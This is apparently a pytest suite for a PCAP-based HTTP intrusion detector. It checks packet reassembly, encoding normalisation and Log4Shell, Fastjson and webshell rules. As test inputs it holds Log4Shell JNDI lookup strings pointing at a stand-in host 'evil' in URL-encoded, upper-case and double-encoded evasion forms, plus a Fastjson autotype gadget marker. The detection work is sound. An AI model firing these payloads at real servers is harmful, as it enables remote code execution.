"""流量检测层测试（v1.2）：PCAP 解析 → TCP 重组 → HTTP 还原 → 规则命中。

测试设计的两个原则（与项目其它测试一致）：
1. **真阳性**：已知攻击必须命中，且是"原始字节没写错"的命中。
2. **真阴性**：正常请求一条都不许报——检测器的误报和漏报同样致命。

另外覆盖三类"只有真实抓包才会暴露"的坑：
- 乱序分段（载荷被拆包，先到的可能是后半段）
- 编码/大小写变形（`%24%7Bjndi`、`${JNDI:`）
- 非 HTTP 流量与服务端响应（不应产生事件）
"""
from datetime import datetime

import pytest

from collectors.pcap import PcapError, normalize, parse_file
from engine.detector import load_rules_dir, run_rules
from models import HttpEvent
from storage import Storage
from tools.pcapgen import (http_request, http_response, pcap_bytes,
                           tcp_frame, udp_frame)

from pathlib import Path

DEMO = Path(__file__).parent / "fixtures" / "traffic_demo.pcap"
RULES = Path(__file__).parent.parent / "rules"


def _detect(events):
    return run_rules(events, load_rules_dir(RULES))


def _write(tmp_path, records, name="x.pcap", **kw):
    p = tmp_path / name
    p.write_bytes(pcap_bytes(records, **kw))
    return p


# ---------- 1. 解析层：演示 PCAP ----------

def test_demo_pcap_extracts_five_requests():
    events = parse_file(DEMO)
    assert len(events) == 5
    assert [e.method for e in events] == ["GET", "POST", "GET", "POST", "POST"]
    assert events[2].uri == "/?x=1"
    assert events[3].uri == "/api/parse"


def test_server_response_and_udp_ignored():
    """服务端响应与 DNS 噪音都不应成为事件。"""
    events = parse_file(DEMO)
    assert all(e.ip != "10.0.0.80" for e in events)   # 没有响应方向的"事件"
    assert all(e.method for e in events)              # 每条都是合法请求方法
    assert len(events) == 5                           # 8 个包里只有 5 个请求


def test_out_of_order_segments_are_reassembled():
    """Fastjson 的 body 被拆成两段且乱序到达，重组后必须完整。"""
    events = parse_file(DEMO)
    fastjson = next(e for e in events if e.uri == "/api/parse")
    assert '"@type":"com.sun.rowset.JdbcRowSetImpl"' in fastjson.body
    assert fastjson.body.rstrip().endswith("}")


# ---------- 2. 检测层：真阳性 ----------

def test_three_rules_hit_on_demo_traffic():
    alerts = _detect(parse_file(DEMO))
    assert len(alerts) == 3
    assert {a.rule_id for a in alerts} == {
        "http-log4shell-jndi", "http-fastjson-autotype", "http-webshell-body-markers"}
    assert all(a.severity == "critical" for a in alerts)
    assert {a.source_ip for a in alerts} == {"10.0.0.66", "10.0.0.77", "10.0.0.88"}
    # 告警里要能定位到具体请求（分析师研判入口）
    assert "/api/parse" in next(a for a in alerts
                                if a.rule_id == "http-fastjson-autotype").detail


def test_url_encoded_payload_is_caught(tmp_path):
    """`%24%7Bjndi%3A` 这类 URL 编码：只匹配原文必然漏，归一化后才能命中。"""
    payload = http_request(
        "GET", "/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D", "shop.internal")
    pcap = _write(tmp_path, [(1793797200.0, tcp_frame(
        "10.0.0.5", "10.0.0.80", 40000, 80, 1000, payload))])
    alerts = _detect(parse_file(pcap))
    assert [a.rule_id for a in alerts] == ["http-log4shell-jndi"]


def test_case_variant_payload_is_caught(tmp_path):
    """`${JNDI:` 大写变形：归一化视图转小写后命中，raw 仍保留原样。"""
    payload = http_request("GET", "/?q=${JNDI:ldap://evil/a}", "shop.internal")
    pcap = _write(tmp_path, [(1793797200.0, tcp_frame(
        "10.0.0.6", "10.0.0.80", 40001, 80, 2000, payload))])
    events = parse_file(pcap)
    assert [a.rule_id for a in _detect(events)] == ["http-log4shell-jndi"]
    assert "${JNDI:" in events[0].raw                  # 证据未被改写
    assert "${jndi:" in events[0].normalized


# ---------- 3. 检测层：真阴性 ----------

def test_benign_traffic_produces_no_alert(tmp_path):
    records = [
        (1793797200.0, tcp_frame("10.0.0.12", "10.0.0.80", 50000, 80, 100,
                                 http_request("GET", "/api/orders?page=2",
                                              "shop.internal"))),
        (1793797200.5, tcp_frame("10.0.0.12", "10.0.0.80", 50001, 80, 200,
                                 http_request("POST", "/api/login", "shop.internal",
                                              body=b'{"user":"alice"}'))),
    ]
    pcap = _write(tmp_path, records)
    assert _detect(parse_file(pcap)) == []


def test_keepalive_two_requests_in_one_flow(tmp_path):
    """同一条连接上的两个请求都要被切出来（HTTP/1.1 keep-alive）。"""
    first = http_request("GET", "/a", "shop.internal")
    second = http_request("GET", "/b", "shop.internal")
    pcap = _write(tmp_path, [(1793797200.0, tcp_frame(
        "10.0.0.9", "10.0.0.80", 40010, 80, 9000, first + second))])
    events = parse_file(pcap)
    assert [e.uri for e in events] == ["/a", "/b"]


def test_normalize_handles_double_encoding():
    """二次编码也能解到不动点（攻击者常用双重 URL 编码绕 WAF）。"""
    assert normalize("%2524%257Bjndi%253A") == "${jndi:"


# ---------- 4. 格式健壮性 ----------

@pytest.mark.parametrize("endian,nano", [(">", False), ("<", False), ("<", True)])
def test_endianness_and_timestamp_precision(tmp_path, endian, nano):
    pcap = _write(tmp_path, [(1793797200.5, tcp_frame(
        "10.0.0.7", "10.0.0.80", 40002, 80, 3000,
        http_request("GET", "/x", "shop.internal")))], endian=endian, nano=nano)
    events = parse_file(pcap)
    assert len(events) == 1
    assert events[0].ts >= datetime(2026, 11, 4)


def test_truncated_file_keeps_earlier_packets(tmp_path):
    """抓包被 kill -9 截断是常态：最后半个包丢弃，之前的包照常解析。

    单个包被截断时不能"尽力解析"——半个帧的 TCP payload 拼进去只会
    制造错误的请求，宁可丢掉这一个包。
    """
    records = [
        (1793797200.0, tcp_frame("10.0.0.8", "10.0.0.80", 40003, 80, 4000,
                                 http_request("GET", "/first", "shop.internal"))),
        (1793797201.0, tcp_frame("10.0.0.8", "10.0.0.80", 40004, 80, 5000,
                                 http_request("GET", "/second", "shop.internal"))),
    ]
    pcap = _write(tmp_path, records)
    truncated = tmp_path / "trunc.pcap"
    truncated.write_bytes(pcap.read_bytes()[:-20])
    events = parse_file(truncated)
    assert [e.uri for e in events] == ["/first"]


def test_unsupported_linktype_raises(tmp_path):
    pcap = _write(tmp_path, [(1793797200.0, b"\x00" * 40)], linktype=999)
    with pytest.raises(PcapError):
        parse_file(pcap)


def test_not_a_pcap_raises(tmp_path):
    bogus = tmp_path / "bogus.bin"
    bogus.write_bytes(b"not a pcap at all, just text padding here......")
    with pytest.raises(PcapError):
        parse_file(bogus)


# ---------- 5. 与存储层/引擎的兼容性 ----------

def test_http_event_stores_like_log_event(tmp_path):
    """HttpEvent 与 AuthEvent 字段对齐 → 存储层零改动可用。"""
    events = parse_file(DEMO)
    db = Storage(tmp_path / "t.db")
    try:
        assert db.insert_events(events) == 5
        assert db.event_stats() == {"http_request": 5}
    finally:
        db.close()


def test_http_event_defaults():
    ev = HttpEvent(ts=datetime(2026, 11, 4, 21, 0, 0), ip="10.0.0.1")
    assert ev.event_type == "http_request" and ev.username is None
    assert ev.service == "http"
